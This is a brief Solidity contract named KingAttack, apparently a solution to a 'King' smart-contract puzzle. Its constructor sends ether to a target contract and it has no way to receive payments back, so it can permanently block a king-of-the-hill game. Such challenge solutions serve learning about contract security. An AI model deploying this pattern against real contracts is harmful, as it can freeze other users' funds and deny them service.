// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address payable _to) payable {
        (bool success, ) = _to.call{value: msg.value}("");

        require(success, "tranfer failed");
    }
}
